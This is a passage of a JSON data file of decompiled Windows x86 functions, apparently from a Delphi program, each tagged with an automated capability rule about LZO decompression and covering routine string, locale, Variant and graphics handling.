        "decompiled_code": "\nvoid fcn.0040d5e4(void)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack44 = 0x40d7b4;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar5 = 1;\n    fcn.0040546c();\n    arg_8h = &fcn.0040d5e4::var_8h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040d2a8(arg_8h);\n    iVar3 = fcn.00409e90();\n    if (iVar3 - 3U < 3) {\n        while (iVar3 = fcn.0040572c(),  iVar5 <= iVar3) {\n            uVar4 = *(in_EAX + -1 + iVar5);\n            if ((*((uVar4 >> 3) + 0x490820) >> (uVar4 & 7) & 1) == 0) {\n                iVar3 = fcn.0040a9e0();\n                if (iVar3 == 0) {\n                    fcn.00405738();\n                    iVar5 = iVar5 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040a9e0();\n                    if (iVar3 == 0) {\n                        fcn.00405738();\n                        iVar5 = iVar5 + 3;\n                    }\n                    else {\n                        iVar3 = fcn.0040a9e0();\n                        if (iVar3 == 0) {\n                            fcn.00405738();\n                            iVar5 = iVar5 + 1;\n                        }\n                        else {\n                            cVar1 = *(in_EAX + -1 + iVar5);\n                            if ((cVar1 == 'Y') || (cVar1 == 'y')) {\n                                fcn.00405738();\n                            }\n                            else {\n                                fcn.00405654();\n                                fcn.00405738();\n                            }\n                        }\n                    }\n                }\n                iVar5 = iVar5 + 1;\n            }\n            else {\n                var_4h = fcn.0040e6ec();\n                arg_8h = &fcn.0040d5e4::var_10h;\n                fcn.00405964();\n                fcn.00405738();\n                iVar5 = iVar5 + var_4h;\n            }\n        }\n    }\n    else {\n        if ((*0x4958cc == 4) || (*0x4958cc - 0x11U < 2)) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        if (bVar2) {\n            for (; iVar3 = fcn.0040572c(),  iVar5 <= iVar3; iVar5 = iVar5 + 1) {\n                cVar1 = *(in_EAX + -1 + iVar5);\n                if ((cVar1 != 'G') && (cVar1 != 'g')) {\n                    fcn.00405654();\n                    fcn.00405738();\n                }\n            }\n        }\n        else {\n            fcn.004054c0();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack44 = 0x40d7bb;\n    iStack48 = 0x40d7b3;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 891
    },
    "0040e4b4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040e4b4(void)\n\n{\n    fcn.0040e4d8();\n    return;\n}\n",
        "token_count": 29
    },
    "0040e4d8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e4d8(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar4 = in_EAX;\n        if (in_EAX != 0) {\n            iVar4 = *(in_EAX + -4);\n        }\n        bVar1 = iVar4 < param_2;\n    }\n    iVar4 = 0;\n    if ((!bVar1) && (iVar4 = param_2,  *0x4958d4 != '\\0')) {\n        iVar3 = 1;\n        iVar4 = 0;\n        if (0 < param_2) {\n            do {\n                uVar2 = *(in_EAX + -1 + iVar3);\n                if ((*((uVar2 >> 3) + 0x490820) >> (uVar2 & 7) & 1) == 0) {\n                    iVar3 = iVar3 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040e724();\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar3 <= param_2);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 310
    },
    "0040e540": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e540(int32_t *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    iVar4 = 1;\n    iVar3 = 1;\n    while ((iVar3 < iVar1 && (iVar4 < in_EDX))) {\n        iVar4 = iVar4 + 1;\n        uVar2 = *(in_EAX + -1 + iVar3);\n        if ((*((uVar2 >> 3) + 0x490820) >> (uVar2 & 7) & 1) == 0) {\n            iVar3 = iVar3 + 1;\n        }\n        else {\n            iVar3 = fcn.0040e724();\n        }\n    }\n    if (((iVar4 == in_EDX) && (iVar3 < iVar1)) &&\n       (uVar2 = *(in_EAX + -1 + iVar3),  (*((uVar2 >> 3) + 0x490820) >> (uVar2 & 7) & 1) != 0)) {\n        iVar3 = fcn.0040e724();\n        iVar3 = iVar3 + -1;\n    }\n    *in_ECX = iVar4;\n    *arg_8h = iVar3;\n    return;\n}\n",
        "token_count": 370
    },
    "0040e5d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e5d0(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *in_stack_ffffffe8;\n    int32_t *piVar3;\n    int32_t aiStack20 [2];\n    \n    piVar3 = aiStack20;\n    aiStack20[0] = 0;\n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar2 = in_EAX;\n        if (in_EAX != 0) {\n            iVar2 = *(in_EAX + -4);\n        }\n        bVar1 = iVar2 < param_2;\n    }\n    iVar2 = aiStack20[0];\n    if (((!bVar1) && (iVar2 = param_2,  1 < param_2)) && (iVar2 = param_2,  *0x4958d4 != '\\0')) {\n        fcn.0040e540(aiStack20);\n        if (aiStack20[0] < param_2 + -1) {\n            bVar1 = true;\n        }\n        else {\n            if (in_EAX != 0) {\n                in_EAX = *(in_EAX + -4);\n            }\n            bVar1 = in_EAX <= piVar3;\n        }\n        iVar2 = aiStack20[0];\n        if (bVar1) {\n            in_stack_ffffffe8 = NULL;\n        }\n        else {\n            in_stack_ffffffe8 = piVar3 + 1;\n        }\n    }\n    aiStack20[0] = iVar2;\n    return CONCAT44(aiStack20[0], in_stack_ffffffe8);\n}\n",
        "token_count": 388
    },
    "0040e654": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e654(uint param_1, uchar *param_2)\n\n{\n    uchar *in_EAX;\n    uchar *puVar1;\n    uchar *puVar2;\n    uchar *in_stack_ffffffec;\n    uchar **ppuVar3;\n    uchar *apuStack16 [2];\n    \n    ppuVar3 = apuStack16;\n    apuStack16[0] = NULL;\n    puVar1 = apuStack16[0];\n    if (0 < param_2) {\n        puVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            puVar1 = *(in_EAX + -4);\n        }\n        if ((puVar1 < param_2) && (param_2 = in_EAX,  in_EAX != NULL)) {\n            param_2 = *(in_EAX + -4);\n        }\n        puVar1 = param_2;\n        if (*0x4958d4 != '\\0') {\n            fcn.0040e540(apuStack16);\n            puVar2 = in_EAX;\n            if (in_EAX != NULL) {\n                puVar2 = *(in_EAX + -4);\n            }\n            in_stack_ffffffec = ppuVar3;\n            puVar1 = apuStack16[0];\n            if ((puVar2 < ppuVar3) && (in_stack_ffffffec = in_EAX,  in_EAX != NULL)) {\n                in_stack_ffffffec = *(in_EAX + -4);\n            }\n        }\n    }\n    apuStack16[0] = puVar1;\n    return CONCAT44(apuStack16[0], in_stack_ffffffec);\n}\n",
        "token_count": 372
    },
    "0040e75c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e75c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    if (param_2 < 1) {\n        bVar3 = false;\n    }\n    else {\n        iVar1 = in_EAX;\n        if (in_EAX != 0) {\n            iVar1 = *(in_EAX + -4);\n        }\n        bVar3 = param_2 <= iVar1;\n    }\n    if (bVar3) {\n        bVar3 = *(in_EAX + -1 + param_2) == '\\\\';\n    }\n    else {\n        bVar3 = false;\n    }\n    if (bVar3) {\n        uVar2 = fcn.0040e478();\n        return uVar2 & 0xffffff00 | uVar2 == '\\0';\n    }\n    return 0;\n}\n",
        "token_count": 216
    },
    "0040e7a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e7a4(uint param_1)\n\n{\n    char cVar1;\n    \n    fcn.004054c0(param_1);\n    cVar1 = fcn.0040e75c();\n    if (cVar1 == '\\0') {\n        fcn.00405738();\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "0040e7f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e7f0(uint param_1)\n\n{\n    char cVar1;\n    \n    fcn.004054c0(param_1);\n    cVar1 = fcn.0040e75c();\n    if (cVar1 != '\\0') {\n        fcn.00405b8c();\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0040e878": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e878(uint param_1, int32_t *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    if (*0x4958d4 == '\\0') {\n        uVar4 = fcn.00409a58();\n    }\n    else {\n        iVar3 = in_EAX;\n        if (in_EAX != 0) {\n            iVar3 = *(in_EAX + -4);\n        }\n        uVar4 = fcn.00405b8c();\n        iVar6 = 1;\n        if (0 < iVar3) {\n            do {\n                iVar5 = fcn.0040595c();\n                *(iVar5 + -1 + iVar6) = *(in_EAX + -1 + iVar6);\n                uVar4 = *(in_EAX + -1 + iVar6);\n                if ((*((uVar4 >> 3) + 0x490820) >> (uVar4 & 7) & 1) == 0) {\n                    cVar2 = *(*param_2 + -1 + iVar6);\n                    uVar4 = cVar2 + 0xa5;\n                    if (cVar2 + 0xbfU < 0x1a) {\n                        uVar4 = fcn.0040595c();\n                        pcVar1 = (uVar4 - 1) + iVar6;\n                        *pcVar1 = *pcVar1 + ' ';\n                    }\n                }\n                else {\n                    iVar6 = iVar6 + 1;\n                    uVar4 = fcn.0040595c();\n                    *((uVar4 - 1) + iVar6) = *(in_EAX + -1 + iVar6);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 <= iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 443
    },
    "00411604": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411604(int32_t arg_8h, uint16_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint pvarg;\n    uint *var_8h;\n    int32_t *var_4h;\n    \n    if (*arg_ch == 0x400c) {\n        fcn.00411604(arg_8h, *(arg_ch + 4), arg_10h, arg_14h);\n        return;\n    }\n    if (arg_8h == 0) {\n        var_8h = NULL;\n    }\n    else {\n        sub.oleaut32.dll_VariantInit();\n        var_8h = &pvarg;\n    }\n    uVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uVar1 = *arg_ch;\n    if (uVar1 < 0x102) {\n        if ((uVar1 == 0x101) || ((uVar1 == 9 || (uVar1 == 0xd)))) {\ncode_r0x00411684:\n            if (*0x49797c != NULL) {\n                (**0x49797c)(var_8h, arg_ch, arg_10h, &arg_14h);\n            }\n            goto code_r0x004116cf;\n        }\n    }\n    else if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) goto code_r0x00411684;\n    cVar2 = fcn.00416124();\n    if (cVar2 == '\\0') {\n        fcn.00410ea0();\n    }\n    else {\n        (**(*var_4h + 0x10))(&arg_14h, arg_10h);\n    }\ncode_r0x004116cf:\n    *in_FS_OFFSET = uVar3;\n    if (var_8h != NULL) {\n        fcn.00411a14();\n        fcn.004115e8();\n    }\n    return;\n}\n",
        "token_count": 473
    },
    "004156dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004156dc(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    \n    uVar1 = *param_2;\n    if (uVar1 < 0xe) {\n        if (uVar1 != 0xd) {\n            if (uVar1 == 0) {\n                fcn.004070f8();\n                return;\n            }\n            if (uVar1 == 1) {\n                if (*0x490a54 != '\\0') {\n                    fcn.00410e04();\n                }\n                fcn.004070f8();\n                return;\n            }\n            if (uVar1 != 9) goto code_r0x0041575d;\n        }\n        fcn.00407110();\n    }\n    else {\n        if (uVar1 == 0x101) {\n            fcn.00415664(param_1);\n            return;\n        }\n        if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) {\n            fcn.00407110();\n            return;\n        }\ncode_r0x0041575d:\n        cVar2 = fcn.00416124();\n        if (cVar2 != '\\0') {\n            fcn.004070f8();\n            cVar2 = fcn.004046f4();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.00410e04();\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "00416680": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00416680(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x41670f;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00416484();\n    cVar1 = *in_EAX;\n    if (cVar1 == '\\x01') {\n        puStack36 = 0x4166bc;\n        fcn.00409e54();\n    }\n    else if ((cVar1 == '\\x02') || (cVar1 == '\\t')) {\n        puStack36 = &fcn.00416680::var_4h;\n        fcn.00405964();\n        fcn.00409e54();\n    }\n    else {\n        puStack36 = 0x4166f7;\n        fcn.004164dc();\n    }\n    *in_FS_OFFSET = puStack36;\n    uStack28 = 0x416716;\n    iStack32 = 0x41670e;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 307
    },
    "0041a5a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041a667)\n// WARNING: Removing unreachable block (ram,0x0041a611)\n// WARNING: Removing unreachable block (ram,0x0041a61d)\n// WARNING: Removing unreachable block (ram,0x0041a689)\n// WARNING: Removing unreachable block (ram,0x0041a672)\n// WARNING: Removing unreachable block (ram,0x0041a694)\n\nvoid fcn.0041a5a4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x41a6cd;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    fcn.0041aea0();\n    iVar2 = iVar1;\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0040555c();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x41a6d4;\n    uStack60 = 0x41a6bf;\n    fcn.0040546c();\n    uStack60 = 0x41a6cc;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 486
    },
    "0041ab8c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041abb6)\n\nvoid fcn.0041ab8c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41abdd;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + 0x1c))();\n    fcn.0041b8b8();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41abe4;\n    uStack24 = 0x41abdc;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 190
    },
    "0041ac74": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ad5a)\n\nvoid __fastcall fcn.0041ac74(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x41adfd;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x41aca6;\n    fcn.0041a24c();\n    uStack68 = 0x41adcb;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    (**(*in_EAX + 0x44))();\n    if (param_2 != NULL) {\n        fcn.0041aea0();\n        iVar2 = fcn.00409864();\n        if (iVar2 == 0) {\n            while (*param_2 != '\\0') {\n                for (; ((cVar1 = *param_2,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r')); param_2 = param_2 + 1\n                    ) {\n                }\n                fcn.0040555c();\n                (**(*in_EAX + 0x38))();\n                if (*param_2 == '\\r') {\n                    param_2 = param_2 + 1;\n                }\n                if (*param_2 == '\\n') {\n                    param_2 = param_2 + 1;\n                }\n            }\n        }\n        else {\n            if (*(*0x492b04 + 0xc) == '\\0') {\n                var_10h = fcn.0040aa38;\n            }\n            else {\n                var_10h = fcn.0040e90c;\n            }\n            fcn.0041aea0();\n            while (*param_2 != '\\0') {\n                fcn.0041aea0();\n                fcn.004058fc();\n                pcVar3 = (*var_10h)();\n                for (; (*param_2 != '\\0' && (pcVar3 != param_2)); param_2 = param_2 + 1) {\n                }\n                fcn.0040555c();\n                (**(*in_EAX + 0x38))();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x41add2;\n    uStack68 = 0x41adca;\n    fcn.0041a308();\n    return;\n}\n",
        "token_count": 695
    },
    "0041c068": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0041c068(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004058fc();\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 47
    },
    "0041cfc4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041cfeb)\n// WARNING: Removing unreachable block (ram,0x0041cff3)\n\nvoid fcn.0041cfc4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41d014;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    fcn.0041e8f0();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41d01b;\n    uStack20 = 0x41d013;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 184
    },
    "0041dd2c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041dd81)\n\nvoid __fastcall fcn.0041dd2c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack56 = &stack0xfffffffc;\n    uStack48 = 0x41df74;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x41df26;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = 0x41dd67;\n    fcn.0041e8b4();\n    uStack72 = 0x41deff;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar3 = 1;\n    *(in_EAX + 0x88) = 1;\n    var_14h = param_2;\n    puStack68 = &stack0xfffffffc;\n    while( true ) {\n        for (; (iVar3 < 1 && (*(iVar3 + -1) != '.')); iVar3 = iVar3 + 1) {\n        }\n        iStack76 = in_EAX + 0x80;\n        fcn.00405964();\n        if (0 < iVar3) break;\n        fcn.00404880();\n        puVar2 = fcn.00416540();\n        if (puVar2 == NULL) {\n            fcn.004054c0();\n            *(in_EAX + 0x88) = 0;\n            (**(*var_14h + 4))();\n            *(in_EAX + 0x88) = 1;\n            if (*(in_EAX + 0x80) != 0) {\n                fcn.0041cf14();\n            }\n            *in_FS_OFFSET = iStack76;\n            *in_FS_OFFSET = iStack64;\ncode_r0x0041df5e:\n            *in_FS_OFFSET = iStack52;\n            puStack44 = 0x41df7b;\n            uStack48 = 0x41df73;\n            fcn.0040546c();\n            return;\n        }\n        var_18h = NULL;\n        if (***puVar2 == '\\a') {\n            var_18h = fcn.004165b0();\n        }\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            fcn.0041dd10(&stack0xfffffffc);\n        }\n        var_14h = var_18h;\n        iVar3 = iVar3 + 1;\n    }\n    fcn.00404880();\n    iVar3 = fcn.00416540();\n    if (iVar3 == 0) {\n        *(in_EAX + 0x88) = 0;\n        (**(*var_14h + 4))();\n        *(in_EAX + 0x88) = 1;\n        if (*(in_EAX + 0x80) != 0) {\n            fcn.0041cf14();\n        }\n    }\n    else {\n        fcn.0041e128();\n    }\n    *in_FS_OFFSET = iStack76;\n    *in_FS_OFFSET = iStack64;\n    goto code_r0x0041df5e;\n}\n",
        "token_count": 875
    },
    "0041f4d8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f4d8(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    \n    bVar1 = *0x10 == 0x14;\n    fcn.00405894();\n    if (bVar1) {\n        if (param_2 != 0) {\n            param_2 = *(param_2 + -4);\n        }\n        if (param_2 < 0x100) {\n            fcn.0041f5d8();\n            fcn.0041f3dc();\n        }\n        else {\n            fcn.0041f5d8();\n            fcn.0041f3dc();\n        }\n        fcn.0041f3dc();\n    }\n    else {\n        fcn.0041f5d8();\n        fcn.0041f3dc();\n        fcn.0041f3dc();\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "0042187c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042187c(int32_t param_1)\n\n{\n    uint arg_8h;\n    \n    if (param_1 != 0) {\n        param_1 = *(param_1 + -4);\n    }\n    param_1 = param_1 + 1;\n    arg_8h = 1;\n    fcn.004058fc();\n    fcn.004219fc(arg_8h, param_1);\n    return;\n}\n",
        "token_count": 102
    },
    "004218ac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004218ac(int32_t param_1)\n\n{\n    uint arg_8h;\n    \n    if (param_1 != 0) {\n        param_1 = *(param_1 + -4);\n    }\n    param_1 = param_1 + 1;\n    arg_8h = 2;\n    fcn.004058fc();\n    fcn.004219fc(arg_8h, param_1);\n    return;\n}\n",
        "token_count": 101
    },
    "00424cd4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424cd4(uint *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    fcn.00424f9c();\n    *param_1 = 0;\n    param_1[1] = 0;\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.004058fc(param_2, param_1);\n    sub.gdi32.dll_GetTextExtentPoint32A(*(in_EAX + 4), uVar1);\n    return;\n}\n",
        "token_count": 143
    },
    "00425434": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.00425434(void)\n\n{\n    int16_t in_AX;\n    \n    if (((in_AX != 1) && (in_AX != 4)) && (in_AX != 8)) {\n        return 0;\n    }\n    return 1 << (in_AX & 0x1f);\n}\n",
        "token_count": 70
    },
    "00429248": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00429248(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    \n    uVar4 = 8;\n    cVar3 = fcn.004291c8();\n    if (cVar3 == '\\x01') {\n        uVar4 = 0;\n    }\n    else {\n        iVar2 = *(in_EAX + 0x28);\n        uVar1 = *(iVar2 + 0x3e);\n        if (uVar1 < 0x11) {\n            if (uVar1 == 0x10) {\n                if (*(iVar2 + 0x40) == 0) {\n                    uVar4 = 4;\n                }\n                else if ((*(iVar2 + 0x40) == 3) && (*(iVar2 + 0x5c) == 0x7e0)) {\n                    uVar4 = 5;\n                }\n            }\n            else if (uVar1 == 1) {\n                uVar4 = 1;\n            }\n            else if (uVar1 == 4) {\n                uVar4 = 2;\n            }\n            else if (uVar1 == 8) {\n                uVar4 = 3;\n            }\n        }\n        else if (uVar1 == 0x18) {\n            uVar4 = 6;\n        }\n        else if ((uVar1 == 0x20) && (*(iVar2 + 0x40) == 0)) {\n            uVar4 = 7;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 362
    },
    "00429790": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00429790(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uVar6;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uchar *puStack256;\n    uint uStack252;\n    int32_t *piStack248;\n    uint uStack244;\n    uint *puStack240;\n    uint uStack236;\n    uchar *puStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack212;\n    uint uStack208;\n    uchar *puStack204;\n    uint uStack200;\n    uint uStack196;\n    uchar *puStack192;\n    uint var_aah;\n    uint var_48h;\n    uint var_44h;\n    ushort var_40h;\n    ushort var_3eh;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint hpal;\n    uint hgdiobj;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint lpbmih;\n    int32_t lpbInit;\n    uint var_10h;\n    uint hdc;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack204 = &stack0xfffffffc;\n    puStack192 = 0x4297c3;\n    var_8h = in_EDX;\n    (**(*in_EDX + 0xc))();\n    bVar5 = var_20h == 0xc;\n    if (bVar5) {\n        var_20h = 0x28;\n    }\n    puStack192 = 0x4297e8;\n    piVar1 = fcn.00402ef0();\n    uStack196 = 0x429cb1;\n    uStack200 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff38;\n    uStack208 = 0x429c84;\n    uStack212 = 